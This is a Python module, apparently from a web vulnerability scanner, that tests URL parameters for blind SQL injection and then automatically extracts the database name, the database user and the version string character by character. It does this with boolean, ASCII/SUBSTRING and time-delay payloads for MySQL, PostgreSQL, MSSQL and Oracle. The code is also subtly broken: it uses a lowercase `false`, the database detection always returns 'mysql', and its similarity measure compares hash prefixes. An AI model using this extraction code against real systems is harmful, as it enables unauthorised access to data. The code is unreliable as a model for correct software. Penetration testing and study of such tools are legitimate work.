"""
Blind SQL injection detection (content-based).
"""
import time
import hashlib
from typing import List, Dict, Optional, Tuple
import logging
from dataclasses import dataclass
import re

from .payloads import SQLiPayloads

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class BlindTestResult:
    """Results from blind SQL injection testing"""
    parameter: str
    technique: str  # 'content', 'time'
    is_vulnerable: bool
    confidence: float
    evidence: Dict
    database_type: Optional[str] = None
    extracted_info: Optional[Dict] = None

class BlindSQLiTester:
    """Blind SQL injection tester (content-based)"""
    
    def __init__(self, payloads: SQLiPayloads = None):
        self.payloads = payloads or SQLiPayloads()
        
        # Content comparison sensitivity (0.0 to 1.0)
        self.similarity_threshold = 0.9
        
        # Response cache to avoid duplicate requests
        self.response_cache: Dict[str, str] = {}
        
        # Common database information to extract
        self.extraction_targets = [
            ('database_length', 'LENGTH((SELECT database()))'),
            ('database_name_char', 'SUBSTRING((SELECT database()),{pos},1)'),
            ('user_length', 'LENGTH((SELECT user()))'),
            ('user_char', 'SUBSTRING((SELECT user()),{pos},1)'),
            ('version_length', 'LENGTH(@@version)'),
            ('version_char', 'SUBSTRING(@@version,{pos},1)'),
        ]
    
    def test_parameter(self, url: str, parameter: str, method: str,
                      get_params: Dict, post_data: Dict, session) -> List[BlindTestResult]:
        """
        Test a parameter for blind SQL injection.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            method: HTTP method
            get_params: GET parameters
            post_data: POST data
            session: Requests session
            
        Returns:
            List of BlindTestResult objects
        """
        results = []
        
        # Test content-based blind SQLi
        content_results = self._test_content_based(
            url, parameter, method, get_params, post_data, session
        )
        results.extend(content_results)
        
        # Test boolean-based blind SQLi (different from earlier boolean tests)
        boolean_results = self._test_boolean_blind(
            url, parameter, method, get_params, post_data, session
        )
        results.extend(boolean_results)
        
        # If blind SQLi is detected, attempt to extract information
        for result in results:
            if result.is_vulnerable and result.confidence > 0.7:
                extracted = self._attempt_extraction(
                    url, parameter, method, get_params, post_data, session,
                    result.database_type
                )
                if extracted:
                    result.extracted_info = extracted
                    result.confidence = min(result.confidence + 0.1, 0.95)
        
        return results
    
    def _test_content_based(self, url: str, parameter: str, method: str,
                           get_params: Dict, post_data: Dict, session) -> List[BlindTestResult]:
        """
        Test for content-based blind SQL injection.
        
        Returns:
            List of BlindTestResult objects
        """
        results = []
        
        # Get baseline response
        baseline_response = self._get_cached_response(
            url, parameter, '1', method, get_params, post_data, session
        )
        
        if not baseline_response:
            return results
        
        baseline_hash = self._hash_response(baseline_response)
        
        # Test blind SQLi payloads
        test_cases = [
            # (true_condition, false_condition, description)
            ("' AND '1'='1", "' AND '1'='2", "Basic blind"),
            ("' OR '1'='1", "' OR '1'='2", "OR-based blind"),
        ]
        
        for true_payload, false_payload, description in test_cases:
            logger.info(f"Testing content-based blind: {description}")
            
            # Get true condition response
            true_response = self._get_cached_response(
                url, parameter, true_payload, method, get_params, post_data, session
            )
            
            if not true_response:
                continue
            
            # Get false condition response
            false_response = self._get_cached_response(
                url, parameter, false_payload, method, get_params, post_data, session
            )
            
            if not false_response:
                continue
            
            # Compare responses
            true_hash = self._hash_response(true_response)
            false_hash = self._hash_response(false_response)
            baseline_hash = self._hash_response(baseline_response)
            
            # Check for differences
            true_diff = true_hash != baseline_hash
            false_diff = false_hash != baseline_hash
            true_false_diff = true_hash != false_hash
            
            is_vulnerable = false
            confidence = 0.0
            evidence = {
                'true_hash': true_hash,
                'false_hash': false_hash,
                'baseline_hash': baseline_hash,
                'true_differs_from_baseline': true_diff,
                'false_differs_from_baseline': false_diff,
                'true_false_differ': true_false_diff,
            }
            
            # Conditions for blind SQLi:
            # 1. True and false conditions produce different responses
            # 2. At least one differs from baseline
            if true_false_diff and (true_diff or false_diff):
                is_vulnerable = True
                
                # Calculate confidence
                confidence_factors = []
                
                if true_diff and false_diff:
                    confidence_factors.append(0.8)  # Both differ from baseline
                else:
                    confidence_factors.append(0.6)  # Only one differs
                
                if true_false_diff:
                    confidence_factors.append(0.7)  # They differ from each other
                
                # Check response similarity
                similarity = self._calculate_similarity(
                    true_response, false_response
                )
                evidence['similarity'] = similarity
                
                if similarity < self.similarity_threshold:
                    confidence_factors.append(0.9 - similarity)  # Lower similarity = higher confidence
                
                confidence = sum(confidence_factors) / len(confidence_factors)
            
            if is_vulnerable and confidence > 0.6:
                # Try to infer database type
                db_type = self._infer_database_from_payload(true_payload)
                
                result = BlindTestResult(
                    parameter=parameter,
                    technique='content',
                    is_vulnerable=True,
                    confidence=confidence,
                    evidence=evidence,
                    database_type=db_type
                )
                results.append(result)
                
                logger.info(f"✅ Potential blind SQLi found in {parameter}")
                logger.info(f"   Confidence: {confidence:.2f}, Technique: {description}")
        
        return results
    
    def _test_boolean_blind(self, url: str, parameter: str, method: str,
                           get_params: Dict, post_data: Dict, session) -> List[BlindTestResult]:
        """
        Test for boolean-based blind SQL injection using conditional responses.
        
        Returns:
            List of BlindTestResult objects
        """
        results = []
        
        # Test cases for boolean blind
        test_queries = [
            # Database name length tests
            ("' AND LENGTH(database())>0 -- ", "' AND LENGTH(database())=0 -- ", "DB length > 0"),
            ("' AND LENGTH(database())=1 -- ", "' AND LENGTH(database())=100 -- ", "DB length = 1"),
            
            # User tests
            ("' AND LENGTH(user())>0 -- ", "' AND LENGTH(user())=0 -- ", "User length > 0"),
            
            # Version tests
            ("' AND @@version LIKE '%' -- ", "' AND @@version LIKE 'x' -- ", "Version exists"),
        ]
        
        for true_query, false_query, description in test_queries:
            logger.info(f"Testing boolean blind: {description}")
            
            # Get responses
            true_response = self._get_cached_response(
                url, parameter, true_query, method, get_params, post_data, session
            )
            false_response = self._get_cached_response(
                url, parameter, false_query, method, get_params, post_data, session
            )
            
            if not true_response or not false_response:
                continue
            
            # Compare responses
            true_hash = self._hash_response(true_response)
            false_hash = self._hash_response(false_response)
            
            if true_hash != false_hash:
                # Possible blind SQLi
                confidence = 0.7
                
                # Additional checks
                baseline = self._get_cached_response(
                    url, parameter, '1', method, get_params, post_data, session
                )
                
                if baseline:
                    baseline_hash = self._hash_response(baseline)
                    
                    # Check if responses differ from baseline
                    true_diff = true_hash != baseline_hash
                    false_diff = false_hash != baseline_hash
                    
                    if true_diff or false_diff:
                        confidence = 0.8
                    
                    if true_diff and false_diff:
                        confidence = 0.9
                
                # Infer database type
                db_type = self._infer_database_from_payload(true_query)
                
                result = BlindTestResult(
                    parameter=parameter,
                    technique='boolean',
                    is_vulnerable=True,
                    confidence=confidence,
                    evidence={
                        'true_query': true_query,
                        'false_query': false_query,
                        'true_hash': true_hash,
                        'false_hash': false_hash,
                        'hashes_differ': True,
                    },
                    database_type=db_type
                )
                results.append(result)
                
                logger.info(f"✅ Potential boolean blind SQLi found")
                logger.info(f"   Confidence: {confidence:.2f}")
        
        return results
    
    def _attempt_extraction(self, url: str, parameter: str, method: str,
                           get_params: Dict, post_data: Dict, session,
                           db_type: str = None) -> Optional[Dict]:
        """
        Attempt to extract information using blind SQLi.
        
        Returns:
            Dictionary with extracted information or None
        """
        extracted = {}
        
        # Determine database type if not provided
        if not db_type:
            db_type = self._detect_database_type(
                url, parameter, method, get_params, post_data, session
            )
        
        if not db_type:
            return None
        
        logger.info(f"Attempting blind extraction for {db_type}")
        
        # Extract database name length
        db_length = self._extract_length(
            url, parameter, method, get_params, post_data, session,
            f"(SELECT database())", db_type
        )
        
        if db_length and db_length > 0:
            extracted['database_length'] = db_length
            
            # Extract database name character by character
            db_name = self._extract_string(
                url, parameter, method, get_params, post_data, session,
                "(SELECT database())", db_length, db_type
            )
            
            if db_name:
                extracted['database_name'] = db_name
        
        # Extract username length
        user_length = self._extract_length(
            url, parameter, method, get_params, post_data, session,
            "(SELECT user())", db_type
        )
        
        if user_length and user_length > 0:
            extracted['user_length'] = user_length
            
            # Extract username
            username = self._extract_string(
                url, parameter, method, get_params, post_data, session,
                "(SELECT user())", user_length, db_type
            )
            
            if username:
                extracted['username'] = username
        
        # Try to extract version info
        version_info = self._extract_version(
            url, parameter, method, get_params, post_data, session, db_type
        )
        
        if version_info:
            extracted['version_info'] = version_info
        
        return extracted if extracted else None
    
    def _extract_length(self, url: str, parameter: str, method: str,
                       get_params: Dict, post_data: Dict, session,
                       query: str, db_type: str) -> Optional[int]:
        """
        Extract length of a query result using blind SQLi.
        
        Returns:
            Length or None
        """
        # Try lengths from 1 to 50
        for length in range(1, 51):
            if db_type == 'mysql':
                payload = f"' AND LENGTH({query})={length} -- "
            elif db_type == 'postgresql':
                payload = f"' AND LENGTH({query})={length} -- "
            elif db_type == 'mssql':
                payload = f"' AND LEN({query})={length} -- "
            elif db_type == 'oracle':
                payload = f"' AND LENGTH({query})={length} -- "
            else:
                payload = f"' AND LENGTH({query})={length} -- "
            
            response = self._get_cached_response(
                url, parameter, payload, method, get_params, post_data, session
            )
            
            if response:
                # Get baseline for comparison
                baseline = self._get_cached_response(
                    url, parameter, "' AND '1'='1", method, get_params, post_data, session
                )
                
                if baseline and self._hash_response(response) == self._hash_response(baseline):
                    return length
        
        return None
    
    def _extract_string(self, url: str, parameter: str, method: str,
                       get_params: Dict, post_data: Dict, session,
                       query: str, length: int, db_type: str) -> Optional[str]:
        """
        Extract a string character by character using blind SQLi.
        
        Returns:
            Extracted string or None
        """
        result_chars = []
        
        for pos in range(1, length + 1):
            # Try each character
            char_found = None
            
            # Test printable ASCII characters
            for ascii_val in range(32, 127):  # Printable range
                char = chr(ascii_val)
                
                if db_type == 'mysql':
                    payload = f"' AND ASCII(SUBSTRING({query},{pos},1))={ascii_val} -- "
                elif db_type == 'postgresql':
                    payload = f"' AND ASCII(SUBSTRING({query},{pos},1))={ascii_val} -- "
                elif db_type == 'mssql':
                    payload = f"' AND ASCII(SUBSTRING({query},{pos},1))={ascii_val} -- "
                elif db_type == 'oracle':
                    payload = f"' AND ASCII(SUBSTR({query},{pos},1))={ascii_val} -- "
                else:
                    payload = f"' AND ASCII(SUBSTRING({query},{pos},1))={ascii_val} -- "
                
                response = self._get_cached_response(
                    url, parameter, payload, method, get_params, post_data, session
                )
                
                if response:
                    # Compare with TRUE condition
                    true_response = self._get_cached_response(
                        url, parameter, "' AND '1'='1", method, get_params, post_data, session
                    )
                    
                    if true_response and self._hash_response(response) == self._hash_response(true_response):
                        char_found = char
                        break
            
            if char_found:
                result_chars.append(char_found)
                logger.debug(f"Extracted char {pos}/{length}: {char_found}")
            else:
                # Couldn't find character, use placeholder
                result_chars.append('?')
            
            # Be polite
            time.sleep(0.1)
        
        return ''.join(result_chars) if result_chars else None
    
    def _extract_version(self, url: str, parameter: str, method: str,
                        get_params: Dict, post_data: Dict, session,
                        db_type: str) -> Optional[str]:
        """Extract version information."""
        version_query = self._get_version_query(db_type)
        
        if not version_query:
            return None
        
        # Try to get version length
        version_length = self._extract_length(
            url, parameter, method, get_params, post_data, session,
            version_query, db_type
        )
        
        if not version_length or version_length == 0:
            return None
        
        # Extract version string (limit to 50 chars for speed)
        version = self._extract_string(
            url, parameter, method, get_params, post_data, session,
            version_query, min(version_length, 50), db_type
        )
        
        return version
    
    def _get_version_query(self, db_type: str) -> Optional[str]:
        """Get version query for database type."""
        queries = {
            'mysql': '@@version',
            'postgresql': 'version()',
            'mssql': '@@version',
            'oracle': '(SELECT banner FROM v$version WHERE rownum=1)'
        }
        return queries.get(db_type)
    
    def _detect_database_type(self, url: str, parameter: str, method: str,
                             get_params: Dict, post_data: Dict, session) -> Optional[str]:
        """Detect database type using blind techniques."""
        # Test database-specific functions
        db_tests = {
            'mysql': ("' AND SLEEP(1) -- ", "' AND '1'='1"),
            'postgresql': ("' AND pg_sleep(1) -- ", "' AND '1'='1"),
            'mssql': ("' WAITFOR DELAY '00:00:01' -- ", "' AND '1'='1"),
            'oracle': ("' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),1) -- ", "' AND '1'='1"),
        }
        
        for db_type, (test_payload, true_payload) in db_tests.items():
            # Get test response
            test_response = self._get_cached_response(
                url, parameter, test_payload, method, get_params, post_data, session
            )
            
            if not test_response:
                continue
            
            # Get true response for comparison
            true_response = self._get_cached_response(
                url, parameter, true_payload, method, get_params, post_data, session
            )
            
            if true_response:
                # Check if responses differ (time-based injection would cause delay/timeout)
                # For now, just check if request succeeded
                if test_response:  # Request completed
                    # Could be time-based, need more sophisticated check
                    pass
        
        # Default to MySQL if can't determine
        return 'mysql'
    
    def _get_cached_response(self, url: str, parameter: str, payload: str,
                            method: str, get_params: Dict, post_data: Dict, session) -> Optional[str]:
        """Get response with caching."""
        cache_key = f"{url}:{parameter}:{payload}:{method}"
        
        if cache_key in self.response_cache:
            return self.response_cache[cache_key]
        
        try:
            if method.upper() == 'GET':
                params = get_params.copy() if get_params else {}
                params[parameter] = payload
                response = session.get(url, params=params, timeout=10)
            else:
                data = post_data.copy() if post_data else {}
                data[parameter] = payload
                response = session.post(url, data=data, timeout=10)
            
            response_text = response.text
            self.response_cache[cache_key] = response_text
            return response_text
            
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return None
    
    def _hash_response(self, response_text: str) -> str:
        """Create hash of response for comparison."""
        return hashlib.md5(response_text.encode()).hexdigest()
    
    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """Calculate similarity between two texts (0.0 to 1.0)."""
        if not text1 or not text2:
            return 0.0
        
        # Simple similarity based on length and hash
        if text1 == text2:
            return 1.0
        
        length1 = len(text1)
        length2 = len(text2)
        
        if length1 == 0 or length2 == 0:
            return 0.0
        
        # Length similarity
        length_sim = 1.0 - (abs(length1 - length2) / max(length1, length2))
        
        # Hash similarity (if first few chars of hash match)
        hash1 = self._hash_response(text1)
        hash2 = self._hash_response(text2)
        
        hash_sim = 0.0
        for i in range(min(6, len(hash1), len(hash2))):
            if hash1[i] == hash2[i]:
                hash_sim += 1/6
        
        return (length_sim + hash_sim) / 2
    
    def _infer_database_from_payload(self, payload: str) -> Optional[str]:
        """Infer database type from payload."""
        if 'SLEEP' in payload.upper():
            return 'mysql'
        elif 'pg_sleep' in payload.lower():
            return 'postgresql'
        elif 'WAITFOR DELAY' in payload.upper():
            return 'mssql'
        elif 'DBMS_PIPE' in payload.upper():
            return 'oracle'
        
        return None

# Test function
def test_blind_tester():
    """Test the blind SQLi tester"""
    tester = BlindSQLiTester()
    
    print("Testing blind extraction methods:")
    
    # Test hash function
    test_text = "Hello World"
    hash1 = tester._hash_response(test_text)
    hash2 = tester._hash_response("Hello World")
    hash3 = tester._hash_response("Goodbye World")
    
    print(f"✓ Same text hash: {hash1 == hash2}")
    print(f"✓ Different text hash: {hash1 != hash3}")
    
    # Test similarity calculation
    sim1 = tester._calculate_similarity("Hello", "Hello")
    sim2 = tester._calculate_similarity("Hello", "World")
    
    print(f"✓ Same text similarity: {sim1:.2f}")
    print(f"✓ Different text similarity: {sim2:.2f}")
    
    # Test database inference
    test_payloads = [
        ("' AND SLEEP(5)--", "mysql"),
        ("' AND pg_sleep(5)--", "postgresql"),
        ("' WAITFOR DELAY '00:00:05'--", "mssql"),
    ]
    
    print("\nDatabase inference from payloads:")
    for payload, expected in test_payloads:
        inferred = tester._infer_database_from_payload(payload)
        correct = inferred == expected
        print(f"  {payload[:30]:<30} -> {inferred} ({'✓' if correct else '✗'})")
    
    return tester

if __name__ == "__main__":
    test_blind_tester()